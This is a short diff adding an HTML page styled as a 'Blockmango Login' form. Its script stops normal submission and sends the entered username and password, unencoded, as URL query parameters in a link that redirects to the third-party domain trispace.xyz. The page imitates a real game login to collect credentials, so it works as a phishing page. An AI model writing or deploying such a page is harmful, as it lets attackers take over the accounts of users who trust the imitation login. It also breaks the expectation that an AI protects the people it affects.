@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Blockmango Login</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <div class="login-container">
+    <h2>Login to Blockmango</h2>
+    <form id="login-form">
+      <div class="input-group">
+        <label for="username">Username:</label>
+        <input type="text" id="username" name="username" required>
+      </div>
+      <div class="input-group">
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password" required>
+      </div>
+      <button type="submit">Login</button>
+    </form>
+  </div>
+
+  <script>
+    document.getElementById('login-form').addEventListener('submit', function(event) {
+      event.preventDefault(); // prevent form submission
+      
+      // Get username and password
+      var username = document.getElementById('username').value;
+      var password = document.getElementById('password').value;
+
+      // Redirect to Blockmango login page with redirect URL
+      var redirectURL = 'https://www.blockmango.com/#/login?redirect_url=https://trispace.xyz/';
+
+      // Redirect to Blockmango login page with username and password as query parameters
+      window.location.href = redirectURL + '?username=' + username + '&password=' + password;
+    });
+  </script>
+</body>
+</html>
